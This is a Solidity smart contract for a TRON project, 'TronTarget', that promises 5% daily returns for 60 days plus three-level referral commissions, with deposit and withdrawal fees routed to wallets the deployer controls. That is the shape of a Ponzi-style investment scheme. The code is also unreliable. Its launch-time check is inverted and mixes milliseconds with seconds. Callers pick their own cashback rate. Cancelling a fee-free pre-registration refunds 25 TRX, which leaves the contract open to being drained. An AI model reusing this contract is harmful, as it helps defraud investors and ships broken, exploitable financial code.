//SourceUnit: Trontarget.sol

/**
*
* TronTarget
*
* https://trontarget.com
* (only for trontarget.com Community)
* Crowdfunding And Investment Program: 5% Daily ROI for 60 Days.
* Referral Program
* 1st Level = 12%
* 2nd Level = 8%
* 3rd Level = 5%
*
**/

pragma solidity ^0.5.10;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Investor {
        address addr;
		uint256 checkpoint;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 reinvestWallet;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256[] referrals;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
        uint256 highestInvestment;
        uint256 cashback;
        bool hasInvested;
        bool isPreRegistered;
    }
}

contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract Trontarget is Ownable {
    using SafeMath for uint256;
    uint256 public constant DEVELOPER_RATE = 40;            // 4% Team, Operation & Development
    uint256 public constant MARKETING_RATE = 40;            // 4% Marketing
    uint256 public constant REFERENCE_RATE = 250;           // 25% Total Refer Income
    uint256 public constant REFERENCE_LEVEL1_RATE = 120;    // 12% Level 1 Income
    uint256 public constant REFERENCE_LEVEL2_RATE = 80;     // 8% Level 2 Income
    uint256 public constant REFERENCE_LEVEL3_RATE = 50;     // 5% Level 3 Income
    uint256 public constant MINIMUM = 100e6;                // Minimum investment : 100 TRX
    uint256 public constant REFERRER_CODE = 1000;           // Root ID : 1000
    uint256 public constant PLAN_INTEREST = 300;            // 300% of the investment
    uint256 public constant PLAN_TERM = 60 days;             // 15 Days
    uint256 public constant CONTRACT_LIMIT = 200;           // 20% Unlocked for Withdrawal Daily
    uint256 public constant PRE_REGISTRATION_FEES = 25;     // 25 TRX Pre-Registration Fees
    uint256 public constant LAUNCHING_TIME = 1610802000000;        // Time when the project will be launched

    uint256 public  preregistered_users;
    uint256 public  contract_balance;
    uint256 private contract_checkpoint;
    uint256 public  latestReferrerCode;
    uint256 public  totalInvestments_;
    uint256 public  totalReinvestments_;
    uint256 public  totalReferralRewards_;

    uint256 public rootID = REFERRER_CODE;

    address payable private developerAccount_;
    address payable private marketingAccount_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;

    event onPreRegister(address investor, uint256 amount);
    event onCancelPreRegistration(address investor);
    event onInvest(address investor, uint256 amount);
    event onReinvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        _init();
    }

    modifier onlyDeveloper(){
        require(msg.sender == developerAccount_);
        _;
    }

    modifier onlyMarketing(){
        require(msg.sender == marketingAccount_);
        _;
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
        uid2Investor[latestReferrerCode].isPreRegistered = true;
    }

    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }

    function setDeveloperAccount(address payable _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function contractInfo() view public returns(uint256 _total_balance, uint256 _total_paid, uint256 _total_investors, uint256 _total_referrer_awards) {
        return (address(this).balance, (totalInvestments_ - address(this).balance), (latestReferrerCode - 999), totalReferralRewards_);
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256,uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory, uint256, uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, investor.plans[i].investmentDate.add(PLAN_TERM), investor.plans[i].lastWithdrawalDate);
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.reinvestWallet,
        investor.referrer,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        investor.planCount,
        investor.checkpoint,
        newDividends,
        investor.cashback,
        investor.highestInvestment
        );
    }

    function getReferrals(uint256 _uid, uint256 _id) public view returns (uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        return uid2Investor[_uid].referrals[_id];
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (PLAN_TERM > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        investmentDates,
        investments,
        currentDividends,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode, bool _hasInvested, bool _isPreRegistered) private returns (uint256) {
        if (uid2Investor[_referrerCode].addr == address(0)) {
            _referrerCode = rootID;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);

        uint256 uid = block.timestamp;
        address2UID[addr] = uid;
        uid2Investor[uid].addr = addr;
        uid2Investor[uid].referrer = _referrerCode;
        uid2Investor[uid].planCount = 0;
        uid2Investor[uid].hasInvested = _hasInvested;
        uid2Investor[uid].isPreRegistered = _isPreRegistered;
        uid2Investor[uid].highestInvestment = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
            }

            // Updating the downline for the 1st level referrer
            uid2Investor[_ref1].referrals.push(address2UID[_addr]);
        }
        return (uid);
    }

    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {

        require(block.timestamp < LAUNCHING_TIME, "Not yet launched");
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];

        bool newUser = false;

        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode, true, false);
            newUser = true;
            //new user
        } else {
          //old user
          //do nothing, referrer is permenant
        }
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];

        require(_amount >= investor.highestInvestment, "Investment should be higher or equal to your last investment");

        if(newUser || (investor.isPreRegistered && !investor.hasInvested)) {
            _calculateReferrerReward(_amount, investor.referrer);
        }

        if(investor.isPreRegistered && !investor.hasInvested) {
            uint256 cashbackAmount = ((_amount * investor.cashback) / 1000);
            investor.reinvestWallet = cashbackAmount;
        }

        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;
        investor.highestInvestment = _amount;
        investor.hasInvested = true;

        investor.planCount = investor.planCount.add(1);

        totalInvestments_ = totalInvestments_.add(_amount);

        uint256 developerPercentage = (_amount.mul(DEVELOPER_RATE)).div(1000);
        developerAccount_.transfer(developerPercentage);
        uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(1000);
        marketingAccount_.transfer(marketingPercentage);
        return true;
    }

    function _preregister(address _addr, uint256 _referrerCode, uint256 _cashback, uint256 _amount) private returns (bool) {
        
        uint256 uid = address2UID[_addr];
        require(block.timestamp < LAUNCHING_TIME, "Pre-registration period over");
        require(uid == 0, "Already preregistered");
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode, false, true);
            preregistered_users = preregistered_users.add(1);
            //new user

            Objects.Investor storage investor = uid2Investor[uid];
            investor.cashback = _cashback;
        }else {
            //do nothing
        }

        return true;
    }

    function _cancelpreregistration(address payable _addr) private returns (bool) {

        uint uid = address2UID[_addr];
        require(block.timestamp < LAUNCHING_TIME, "Preregistration cancellation period over");
        require(uid > 0, "Not preregistered");

        uid2Investor[uid2Investor[uid].referrer].level1RefCount = uid2Investor[uid2Investor[uid].referrer].level1RefCount.sub(1);

        uint256 firstLevelReferrer = uid2Investor[uid].referrer;
        uint256 secondLevelReferrer = uid2Investor[firstLevelReferrer].referrer;
        uint256 thirdLevelReferrer = uid2Investor[secondLevelReferrer].referrer;
        
        uint256 firstLevelCount = uid2Investor[uid].level1RefCount;
        uint256 secondLevelCount = uid2Investor[uid].level2RefCount;
        uint256 thirdLevelCount = uid2Investor[uid].level3RefCount;

        uid2Investor[firstLevelReferrer].level2RefCount = uid2Investor[firstLevelReferrer].level2RefCount.sub(firstLevelCount);
        uid2Investor[firstLevelReferrer].level3RefCount = uid2Investor[firstLevelReferrer].level3RefCount.sub(secondLevelCount);

        uid2Investor[secondLevelReferrer].level2RefCount = uid2Investor[secondLevelReferrer].level2RefCount.sub(1);
        uid2Investor[secondLevelReferrer].level3RefCount = uid2Investor[secondLevelReferrer].level3RefCount.sub(firstLevelCount);

        uid2Investor[thirdLevelReferrer].level3RefCount = uid2Investor[thirdLevelReferrer].level3RefCount.sub(1);

        // Move the downline to the top
        for (uint256 i = 0; i < uid2Investor[uid].referrals.length; i++) {
            uint256 referralUID = uid2Investor[uid].referrals[i];
            Objects.Investor storage investor = uid2Investor[referralUID];

            if(investor.referrer != 0x0) {
                investor.referrer = rootID;

                uint256 firstLevelCount = investor.level1RefCount;
                uint256 secondLevelCount = investor.level2RefCount;

                uid2Investor[rootID].level1RefCount = uid2Investor[rootID].level1RefCount.add(1);
                uid2Investor[rootID].level2RefCount = uid2Investor[rootID].level2RefCount.add(firstLevelCount);
                uid2Investor[rootID].level3RefCount = uid2Investor[rootID].level3RefCount.add(secondLevelCount);

                uint256 rootIDFirstReferrer = uid2Investor[rootID].referrer;
                uint256 rootIDSecondReferrer = uid2Investor[rootIDFirstReferrer].referrer;

                uid2Investor[rootIDFirstReferrer].level2RefCount = uid2Investor[rootIDFirstReferrer].level2RefCount.add(1);
                uid2Investor[rootIDFirstReferrer].level3RefCount = uid2Investor[rootIDFirstReferrer].level3RefCount.add(firstLevelCount);

                uid2Investor[rootIDSecondReferrer].level3RefCount = uid2Investor[rootIDSecondReferrer].level3RefCount.add(1);
            }
        }

        // Cancelling the pre-registration and removing the investor
        delete uid2Investor[uid];
        delete address2UID[_addr];

        // Returning the pre_registration fees
        _addr.transfer(PRE_REGISTRATION_FEES * 1000000); // Multiplying it by a million

        // Updating the overall preregistrations
        preregistered_users = preregistered_users.sub(1);

        return true;
    }

    function _reinvestAll(address _addr, uint256 _amount) private returns (bool) {

        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        require(_amount >= uid2Investor[uid].highestInvestment, "Investment should be higher or equal to your last investment");

        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);
        investor.highestInvestment = _amount;

        totalReinvestments_ = totalReinvestments_.add(_amount);

        uint256 developerPercentage = (_amount.mul(DEVELOPER_RATE)).div(1000);
        developerAccount_.transfer(developerPercentage);
        uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(1000);
        marketingAccount_.transfer(marketingPercentage);

        return true;
    }

    function invest(uint256 _referrerCode) public payable {
        if (_invest(msg.sender, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function preregister(uint256 _referrerCode, uint256 _cashback) public payable {
        if(_preregister(msg.sender, _referrerCode, _cashback, msg.value)) {
            emit onPreRegister(msg.sender, msg.value);
        }
    }

    function cancelpreregistration() public payable {
        if(_cancelpreregistration(msg.sender)) {
            emit onCancelPreRegistration(msg.sender);
        }
    }

    function withdraw() public {

        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "User doesn't exists");

        //require(withdrawAllowance(), "Withdraw are not allowed between 0am to 4am UTC");

        //only once a day
		//require(block.timestamp > uid2Investor[uid].checkpoint + 1 days , "Only once a day");

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , PLAN_INTEREST , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }

        uint256 withdrawingAmount = withdrawalAmount;
        if(block.timestamp < uid2Investor[uid].checkpoint + 1 days) {
            // User is withdrawing more than once in a day
            uint256 withdrawalCharges = (withdrawalAmount.mul(100)).div(1000);
            if(withdrawalAmount < 10000000) {
                // Withdrawal amount is less than 5 TRX
                uint256 withdrawalChargesLeft = 10000000 - withdrawalAmount;
                if(uid2Investor[uid].reinvestWallet > withdrawalChargesLeft) {
                    uid2Investor[uid].reinvestWallet = uid2Investor[uid].reinvestWallet.sub(withdrawalChargesLeft);
                }else {
                    uid2Investor[uid].reinvestWallet = 0x0;
                }

                withdrawalAmount = 0;
            }else if(withdrawalCharges < 10000000) {
                // Withdrawal Charges is less than 10 TRX
                withdrawalAmount = withdrawalAmount.sub(10000000);
            }
        }
        uid2Investor[uid].checkpoint = block.timestamp;

        if(withdrawalAmount>0){
            uint256 reinvestAmount = withdrawalAmount.div(2);
            if(withdrawalAmount > 90e9 ){
                reinvestAmount = withdrawalAmount.sub(45e9);
            }
            //reinvest
            uid2Investor[uid].reinvestWallet = uid2Investor[uid].reinvestWallet.add(reinvestAmount);
            //withdraw
            msg.sender.transfer(withdrawalAmount.sub(reinvestAmount));
            uint256 developerPercentage = (withdrawingAmount.mul(DEVELOPER_RATE)).div(1000);
            developerAccount_.transfer(developerPercentage);
            uint256 marketingPercentage = (withdrawingAmount.mul(MARKETING_RATE)).div(1000);
            marketingAccount_.transfer(marketingPercentage);
        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function reinvest() public {

        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "User doesn't exists");

        //only once a day
		//require(block.timestamp > uid2Investor[uid].checkpoint + 1 days , "Only once in a day");
        uid2Investor[uid].checkpoint = block.timestamp;

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , PLAN_INTEREST , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }

        if (uid2Investor[uid].availableReferrerEarnings>0) {
            withdrawalAmount += uid2Investor[uid].availableReferrerEarnings;
            uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
            uid2Investor[uid].availableReferrerEarnings = 0;
        }

        if (uid2Investor[uid].reinvestWallet>0) {
            withdrawalAmount += uid2Investor[uid].reinvestWallet;
            uid2Investor[uid].reinvestWallet = 0;
        }


        if(withdrawalAmount>0){
            //reinvest
            _reinvestAll(msg.sender,withdrawalAmount);
        }

        emit onReinvest(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return _amount * (_now - _start) * _dailyInterestRate / 60 / 86400000;
        //return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60);
    }

    function _isInvestorActive(uint256 _uid) private view returns (bool) {
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256 activeInvestmentCount = investor.planCount;

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            if (investor.plans[i].isExpired) {
                activeInvestmentCount = activeInvestmentCount.sub(1);
            }
        }

        if(activeInvestmentCount == 0) {
            return (false);
        } else {
            return (true);
        }
    }

    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {

        uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(1000);
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _refAmount = 0;

            if (_ref1 != 0) {
                if(_isInvestorActive(_ref1)) {
                    _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                    _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                    uid2Investor[_ref1].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref1].availableReferrerEarnings);
                }
            }

            if (_ref2 != 0) {
                if(_isInvestorActive(_ref2)) {
                    _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                    _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                    uid2Investor[_ref2].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref2].availableReferrerEarnings);
                }
            }

            if (_ref3 != 0) {
                if(_isInvestorActive(_ref3)) {
                    _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                    _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                    uid2Investor[_ref3].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref3].availableReferrerEarnings);
                }
            }

            totalReferralRewards_ = totalReferralRewards_.add(_allReferrerAmount);
        }

    }

    function updateBalance() public {
        //only once a day
		require(block.timestamp > contract_checkpoint + 1 days , "Only once a day");
        contract_checkpoint = block.timestamp;
        contract_balance = getBalance();
    }

    function getHour() public view returns (uint8){
        return uint8((block.timestamp / 60 / 60) % 24);
    }

    function withdrawAllowance() public view returns(bool){
        uint8 hour = getHour();
        if(hour >= 0 && hour <= 3){
            return false;
        }
        else{
            return true;
        }
    }

    function isPreRegistered() public view returns(bool){
        uint256 uid = address2UID[msg.sender];
        if(uid == 0) {
            return false;
        }

        Objects.Investor storage investor = uid2Investor[uid];
        return investor.isPreRegistered;
    }

    function changeDeveloper(address payable newAddress) public onlyDeveloper {
        developerAccount_ = newAddress;
    }

    function changeMarketing(address payable newAddress) public onlyMarketing {
        marketingAccount_ = newAddress;
    }

    function changeRootID(uint256 newID) public onlyOwner {
        rootID = newID;
    }

}